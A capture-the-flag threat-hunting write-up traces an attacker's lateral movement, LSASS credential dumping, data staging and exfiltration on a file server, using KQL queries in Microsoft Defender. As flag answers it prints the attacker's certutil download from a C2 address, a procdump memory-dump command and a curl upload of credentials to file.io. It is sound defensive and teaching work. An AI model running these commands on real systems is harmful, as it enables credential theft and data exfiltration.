# SOC Challenge: Virtual Machine Compromise — THE AZUKI BREACH SAGA PART 2: Cargo Hold

![Threat Hunt](https://img.shields.io/badge/Threat_Hunt-Active-red) ![KQL](https://img.shields.io/badge/KQL-Advanced-blue) ![MITRE%20ATT%26CK](https://img.shields.io/badge/MITRE-ATT%26CK-orange)

**Analyst:** Tiernan Falcon  
**Date:** December 6th, 2025   
**Source:** CyberRange SOC Challenge   
**System:** azuki-fileserver01   
**Platform:** Microsoft Defender for Endpoint

---

## 🎯 Skills Demonstrated

- **Kusto Query Language (KQL)** - Advanced queries for threat hunting
- **Microsoft Defender for Endpoint (MDE)** - Enterprise EDR platform
- **MITRE ATT&CK Framework** - Attack lifecycle mapping and TTP identification
- **Threat Hunting** - Proactive threat detection and hypothesis-driven investigation
- **Incident Response** - Evidence collection, timeline reconstruction, and remediation
- **Digital Forensics** - Artifact analysis and anti-forensics detection
- **Security Operations** - Log analysis and behavioral detection
- **Technical Documentation** - Professional security reporting and communication

---

## 📑 Table of Contents

1. [Executive Summary](#executive-summary)
2. [Attack Timeline](#attack-timeline)
3. [MITRE ATT&CK Mapping](#️-attack-lifecycle-mitre-attck-mapping)
4. [Technical Analysis](#-technical-analysis)
   - [Lateral Movement & Discovery](#1-lateral-movement--discovery)
   - [Defense Evasion & Staging](#2-defense-evasion--staging)
   - [Collection & Exfiltration](#3-collection--exfiltration)
   - [Credential Access](#4-credential-access)
5. [Remediation & Recommendations](#️-remediation--recommendations)
6. [Detailed Investigation & Flag Solutions](#️-detailed-investigation--flag-solutions)
   - [Flags 1-20: Step-by-Step Methodology](#-flag-1-initial-access---return-connection-source)
7. [Reflections](#-reflections)

---

## 🛡️ Executive Summary

**Incident Date:** November 2025  
**Analyst:** Tiernan Falcon  
**Tools Used:** Microsoft Defender for Endpoint (MDE), KQL (Kusto Query Language)

### Scenario

Following an alert regarding suspicious network activity 72 hours after a suspected initial compromise, a threat hunt was initiated to investigate lateral movement and potential data exfiltration within the Azuki Import/Export network.

### Findings

The investigation confirmed a successful compromise of the file server (`azuki-fileserver01`). The attacker leveraged legitimate administrative tools ("Living off the Land") to conduct discovery, stage sensitive data, dump credentials (LSASS), and exfiltrate data to an external cloud storage provider (`file.io`). Persistence was established via Registry Run keys.

---

## ⏱️ Attack Timeline

| Timestamp | Phase | Activity |
|-----------|-------|----------|
| **Nov 19, 2025** | Initial Access | Attacker establishes initial foothold on `azuki` workstation |
| **Nov 22, 2025** | Return Connection | Attacker returns from `159.26.106.98` approximately 72 hours later |
| **Nov 22, 2025** | Lateral Movement | RDP pivot to `azuki-fileserver01` (10.1.0.188) using `fileadmin` account |
| **Nov 22, 2025** | Discovery | Network and privilege enumeration (`net view`, `whoami /all`, `ipconfig /all`) |
| **Nov 22, 2025** | Defense Evasion | Created hidden staging directory `C:\Windows\Logs\CBS` |
| **Nov 22, 2025** | Defense Evasion | Downloaded `ex.ps1` via `certutil` from C2 server (78.141.196.6) |
| **Nov 22, 2025** | Credential Access | Dumped LSASS memory using renamed `pd.exe` (procdump) |
| **Nov 22, 2025** | Collection | Staged sensitive data from FileShares (IT-Admin, Financial, Contracts) |
| **Nov 22, 2025** | Collection | Compressed staged data into `credentials.tar.gz` |
| **Nov 22, 2025** | Exfiltration | Exfiltrated archives to `file.io` via `curl` |
| **Nov 22, 2025** | Persistence | Established persistence via Registry Run key (`FileShareSync` → `svchost.ps1`) |
| **Nov 22, 2025** | Anti-Forensics | Deleted PowerShell history file (`ConsoleHost_history.txt`) |

---

## 🗺️ Attack Lifecycle (MITRE ATT&CK Mapping)

| Tactic | ID | Technique | Observation |
|--------|----|-----------| ------------|
| **Lateral Movement** | [T1021.001](https://attack.mitre.org/techniques/T1021/001/) | Remote Services: RDP | Attacker moved from beachhead to `azuki-fileserver01` using `mstsc.exe`. |
| **Discovery** | [T1087](https://attack.mitre.org/techniques/T1087/), [T1016](https://attack.mitre.org/techniques/T1016/) | Account/Network Discovery | Used `whoami /all`, `ipconfig /all`, `net share`, and `net view`. |
| **Defense Evasion** | [T1036.003](https://attack.mitre.org/techniques/T1036/003/) | Masquerading | Renamed Sysinternals ProcDump to `pd.exe` to avoid detection. |
| **Defense Evasion** | [T1564.001](https://attack.mitre.org/techniques/T1564/001/) | Hidden Files | Used `attrib +h +s` to hide the staging directory `C:\Windows\Logs\CBS`. |
| **Credential Access** | [T1003.001](https://attack.mitre.org/techniques/T1003/001/) | OS Credential Dumping | Dumped `lsass.exe` memory using the renamed `pd.exe`. |
| **Collection** | [T1119](https://attack.mitre.org/techniques/T1119/) | Automated Collection | Used `xcopy` to stage specific folders (Contracts, Financial, IT-Admin). |
| **Exfiltration** | [T1567](https://attack.mitre.org/techniques/T1567/) | Exfiltration Over Web Service | Exfiltrated staged `.tar.gz` archives via `curl` to `https://file.io`. |
| **Persistence** | [T1547.001](https://attack.mitre.org/techniques/T1547/001/) | Registry Run Keys | Added a registry key to `HKCU\...\CurrentVersion\Run` for persistence. |

---

## 🔎 Technical Analysis

### 1. Lateral Movement & Discovery

The attacker pivoted to the critical file server `azuki-fileserver01` (10.1.0.188). Once on the box, they initiated a discovery phase to identify user privileges and network resources.

**Key Evidence:**

- **Command:** `net view \\10.1.0.188` (Enumerating remote shares)
- **Command:** `whoami /all` (Checking privileges)

**KQL Query Used:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where ProcessCommandLine has_any ("share", "view", "whoami", "ipconfig")
| project Timestamp, ProcessCommandLine
```

---

### 2. Defense Evasion & Staging

To avoid detection, the attacker hid their staging directory inside a system log folder (`C:\Windows\Logs\CBS`) using the `attrib` command. They also leveraged `certutil.exe` (a LOLBin) to download a PowerShell script (`ex.ps1`) from their C2 server.

**Key Evidence:**

- **Staging Path:** `C:\Windows\Logs\CBS`
- **Hiding Command:** `attrib.exe +h +s C:\Windows\Logs\CBS`
- **Download Command:** `certutil.exe -urlcache -f http://78.141.196.6:7331/ex.ps1 ...`

---

### 3. Collection & Exfiltration

The attacker targeted sensitive business units (Financial, Contracts, Shipping, IT-Admin). They used `xcopy` to replicate the directory structures and `tar.exe` to compress the data before exfiltration.

**Key Evidence:**

- **Staging Command:** `xcopy.exe C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y`
- **Compression:** `tar.exe -czf ... credentials.tar.gz ...`
- **Exfiltration:** `curl.exe -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io`

**KQL Query Used:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where ProcessCommandLine has_any ("curl", "tar", "xcopy")
| project Timestamp, ProcessCommandLine
```

---

### 4. Credential Access

The attacker attempted to harvest credentials by dumping the memory of the Local Security Authority Subsystem Service (LSASS). They renamed the Sysinternals tool `procdump.exe` to `pd.exe` to bypass basic signature detections.

**Key Evidence:**

- **Tool:** `pd.exe` (Renamed Procdump)
- **Command:** `pd.exe -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp`
- **Compromised Account:** `fileadmin`

---

## 🛡️ Remediation & Recommendations

Based on the findings, the following actions are recommended to contain and remediate the threat:

1. **Isolation:** Immediately isolate `azuki-fileserver01` from the network to prevent further data loss.

2. **Credential Rotation:** Force a password reset for the `fileadmin` account and the `KRBTGT` account (due to LSASS compromise).

3. **Block Indicators:**
   - Block traffic to `78.141.196.6` (Attacker C2).
   - Block traffic to `file.io` at the perimeter firewall.

4. **Forensics:** Preserve the `lsass.dmp` file and the `ConsoleHost_history.txt` (if recoverable) for further forensic analysis.

5. **Detection Engineering:** Create detection rules for:
   - Usage of `certutil` with `-urlcache`.
   - Renamed instances of `procdump`.
   - `curl` commands posting data to file sharing sites.

---

# 🔍 Detailed Investigation & Flag Solutions

This section documents the step-by-step investigation methodology. Each flag represents a specific stage in the attack lifecycle, uncovered using Kusto Query Language (KQL) in Microsoft Defender for Endpoint.

---

## 🚩 FLAG 1: INITIAL ACCESS - Return Connection Source

**Question:** Identify the source IP address of the return connection?  
**Answer:** `159.26.106.98`

**Thought Process:**  
The attacker returned "approximately 72 hours" after the initial access (Nov 19th). We needed to find a remote logon event on the initial beachhead machine (`azuki`) occurring around Nov 22nd. We can see the remote access at 9:27 AM.

**KQL Query:**

```kql
DeviceLogonEvents
| where DeviceName contains "azuki"
| where LogonType == "RemoteInteractive"
| where Timestamp > datetime(2025-11-21) // ~72 hours after initial access
| project Timestamp, RemoteIP, DeviceName, AccountName
| order by Timestamp asc
```
<img width="708" height="209" alt="image" src="https://github.com/user-attachments/assets/3ccf36d0-bd1d-44d3-925e-c9f166e43f55" />


---

## 🚩 FLAG 2: LATERAL MOVEMENT - Compromised Device

**Question:** Identify the compromised file server device name?  
**Answer:** `azuki-fileserver01`

**Thought Process:**  
Attackers often use RDP (`mstsc.exe`) to pivot. We searched for `mstsc.exe` execution on the beachhead machine (`azuki`) to find the target IP (`10.1.0.188`), then resolved that IP to a hostname, which we actually saw in the first query.

**KQL Query:**

```kql
// Step 1: Find the target IP from mstsc execution on the beachhead
DeviceProcessEvents
| where DeviceName contains "azuki"
| where Timestamp between ( datetime(2025-11-22T00:27:58.4166424Z) .. datetime(2025-11-22T01:27:58.4166424Z) )  // searching +1 hour gap from return connection
| where FileName =~ "mstsc.exe"
| project Timestamp, ProcessCommandLine, DeviceName
| order by Timestamp asc

<img width="651" height="187" alt="image" src="https://github.com/user-attachments/assets/ecb6e010-0c05-431c-a68c-386ed7fddec6" />


// Step 2: Resolve IP to Hostname
DeviceNetworkInfo
| where IPAddresses contains "10.1.0.188"
| where Timestamp between ( datetime(2025-11-22T00:27:58.4166424Z) .. datetime(2025-11-22T01:27:58.4166424Z) )  
| distinct DeviceName
```

---

## 🚩 FLAG 3: LATERAL MOVEMENT - Compromised Account

**Question:** Identify the compromised administrator account?  
**Answer:** `fileadmin`

**Thought Process:**  
Once we identified the victim machine (`azuki-fileserver01`), we queried logon events to see which account was being used for the remote access.

**KQL Query:**

```kql
DeviceLogonEvents
| where DeviceName == "azuki-fileserver01"
| where LogonType == "RemoteInteractive"
| project AccountName, Timestamp
```

---

## 🚩 FLAG 4: DISCOVERY - Share Enumeration Command

**Question:** Identify the command used to enumerate local network shares?  
**Answer:** `"net.exe" share`

**Thought Process:**  
We searched for standard Windows discovery commands. `net share` is used to list local shares. A broad keyword search for "share" in the command line revealed the exact syntax.

**KQL Query:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where ProcessCommandLine contains "net" and ProcessCommandLine contains "share"
| project ProcessCommandLine
```

---

## 🚩 FLAG 5: DISCOVERY - Remote Share Enumeration

**Question:** Identify the command used to enumerate remote shares?  
**Answer:** `net view \\10.1.0.188`

**Thought Process:**  
Similar to Flag 4, but looking for `net view` targeting a remote system (indicated by the `\\` UNC path prefix).

**KQL Query:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where ProcessCommandLine contains "net" and ProcessCommandLine contains "view"
| project ProcessCommandLine
```

---

## 🚩 FLAG 6: DISCOVERY - Privilege Enumeration

**Question:** Identify the command used to enumerate user privileges?  
**Answer:** `whoami /all`

**Thought Process:**  
`whoami` is the standard tool for checking current user permissions and group membership.

**KQL Query:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where ProcessCommandLine contains "whoami"
| project ProcessCommandLine
```

---

## 🚩 FLAG 7: DISCOVERY - Network Configuration Command

**Question:** Identify the command used to enumerate network configuration?  
**Answer:** `ipconfig /all`

**Thought Process:**  
`ipconfig` is the standard tool for checking network adapter settings.

**KQL Query:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where ProcessCommandLine contains "ipconfig"
| project ProcessCommandLine
```

---

## 🚩 FLAG 8: DEFENSE EVASION - Directory Hiding Command

**Question:** Identify the command used to hide the staging directory?  
**Answer:** `attrib +h +s C:\Windows\Logs\CBS`

**Thought Process:**  
The `attrib` command modifies file attributes. Attackers use `+h` (hidden) and `+s` (system) to hide their staging folders from casual view.

**KQL Query:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where ProcessCommandLine contains "attrib"
| project ProcessCommandLine
```

---

## 🚩 FLAG 9: COLLECTION - Staging Directory Path

**Question:** Identify the data staging directory path?  
**Answer:** `C:\Windows\Logs\CBS`

**Thought Process:**  
This was derived directly from the command found in Flag 8. The path `C:\Windows\Logs\CBS` (a legitimate-looking system path) was the target of the hiding command.

---

## 🚩 FLAG 10: DEFENSE EVASION - Script Download Command

**Question:** Identify the command used to download the PowerShell script?  
**Answer:** `certutil -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1`

**Thought Process:**  
We searched for "Living off the Land" binaries (LOLBins) making network connections. `certutil` is a certificate utility often abused to download files.

**KQL Query:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where ProcessCommandLine has_any ("certutil", "curl", "wget")
| where ProcessCommandLine contains "http"
| project ProcessCommandLine
```

---

## 🚩 FLAG 11: COLLECTION - Credential File Discovery

**Question:** What credential file was created in the staging directory?  
**Answer:** `IT-Admin-Passwords.csv`

**Thought Process:**  
We investigated files created in the staging directory (`C:\Windows\Logs\CBS`) or sourced from sensitive shares. We looked for spreadsheet extensions (`.csv`, `.xlsx`) with high-value names.

**KQL Query:**

```kql
DeviceFileEvents
| where DeviceName == "azuki-fileserver01"
| where FolderPath contains "CBS" or FolderPath contains "Admin"
| where FileName endswith ".csv" or FileName endswith ".xlsx"
| project FileName, FolderPath
```

---

## 🚩 FLAG 12: COLLECTION - Recursive Copy Command

**Question:** What command was used to stage data from a network share?  
**Answer:** `"xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y`

**Thought Process:**  
`xcopy` (or `robocopy`) is used for bulk file copying. We looked for commands moving data from shares (`C:\FileShares`) to the staging folder.

**KQL Query:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where ProcessCommandLine contains "xcopy"
| project ProcessCommandLine
```

---

## 🚩 FLAG 13: COLLECTION - Compression Command

**Question:** What command was used to compress the staged collection data?  
**Answer:** `"tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .`

**Thought Process:**  
Attackers compress data before exfiltration to save bandwidth. `tar.exe` is built-in on modern Windows. We searched for command lines creating archive files (`.tar.gz`).

**KQL Query:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where ProcessCommandLine contains "tar"
| project ProcessCommandLine
```

---

## 🚩 FLAG 14: CREDENTIAL ACCESS - Renamed Tool

**Question:** What was the renamed credential dumping tool?  
**Answer:** `pd.exe`

**Thought Process:**  
Attackers often rename tools to bypass simple detections. We searched for processes where the `OriginalFileName` (internal metadata) was "procdump" (a Sysinternals tool) but the actual `FileName` was different.

**KQL Query:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where ProcessVersionInfoOriginalFileName =~ "procdump"
| project FileName, ProcessCommandLine
```

---

## 🚩 FLAG 15: CREDENTIAL ACCESS - Memory Dump Command

**Question:** What command was used to dump process memory for credential extraction?  
**Answer:** `"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp`

**Thought Process:**  
Using the renamed tool (`pd.exe`), we found the command targeting the LSASS process. The `-ma` flag (MiniDumpAllMemory) is the signature of a credential dump.

**KQL Query:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where FileName =~ "pd.exe"
| project ProcessCommandLine
```

---

## 🚩 FLAG 16: EXFILTRATION - Upload Command

**Question:** What command was used to exfiltrate the staged data?  
**Answer:** `curl -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io`

**Thought Process:**  
We looked for `curl` commands using the `-F` flag, which indicates a form-based file upload to a web server.

**KQL Query:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where ProcessCommandLine contains "curl" and ProcessCommandLine contains "-F"
| project ProcessCommandLine
```

---

## 🚩 FLAG 17: EXFILTRATION - Cloud Service

**Question:** What cloud service was used for data exfiltration?  
**Answer:** `file.io`

**Thought Process:**  
The destination URL in the exfiltration command (Flag 16) revealed the service used.

---

## 🚩 FLAG 18: PERSISTENCE - Registry Value Name

**Question:** What registry value name was used to establish persistence?  
**Answer:** `FileShareSync`

**Thought Process:**  
Attackers often use Registry Run keys to auto-start malware. We searched `DeviceRegistryEvents` for modifications to `CurrentVersion\Run`.

**KQL Query:**

```kql
DeviceRegistryEvents
| where DeviceName == "azuki-fileserver01"
| where RegistryKey contains "CurrentVersion\\Run"
| where ActionType == "RegistryValueSet"
| project RegistryValueName, RegistryValueData
```

---

## 🚩 FLAG 19: PERSISTENCE - Beacon Filename

**Question:** What is the persistence beacon filename?  
**Answer:** `svchost.ps1`

**Thought Process:**  
The `RegistryValueData` from the Flag 18 query pointed to the file being executed on startup: `C:\...\svchost.ps1`. This is a masquerade; `svchost` is normally an `.exe`, not a `.ps1`.

---

## 🚩 FLAG 20: ANTI-FORENSICS - History File Deletion

**Question:** What PowerShell history file was deleted?  
**Answer:** `ConsoleHost_history.txt`

**Thought Process:**  
Attackers delete command history to cover their tracks. We searched for file deletion events targeting files with "history" in the name.

**KQL Query:**

```kql
DeviceFileEvents
| where DeviceName == "azuki-fileserver01"
| where ActionType == "FileDeleted"
| where FileName contains "history"
| project FileName
```

---

## 💡 Reflections

This hunt reinforced the importance of monitoring "Living off the Land" binaries (LOLBins). The attacker used almost entirely native Windows tools (`net`, `xcopy`, `tar`, `curl`, `certutil`) to conduct a sophisticated attack, which would likely bypass traditional antivirus solutions that only look for known malware signatures. Behavior-based KQL hunting was essential to uncovering this activity.

### Key Takeaways

1. **LOLBins are powerful:** Attackers don't need custom malware when legitimate tools provide the same functionality.
2. **Context matters:** Individual commands like `whoami` or `ipconfig` are benign, but when combined in sequence, they reveal attacker patterns.
3. **Metadata is critical:** The `ProcessVersionInfoOriginalFileName` field was key to detecting the renamed `procdump` tool.
4. **Time-based analysis:** Understanding the attack timeline helped prioritize investigation areas and correlate events.
5. **Defense-in-depth:** Multiple detection opportunities existed (network traffic, process creation, file operations, registry modifications), highlighting the importance of comprehensive logging.

---


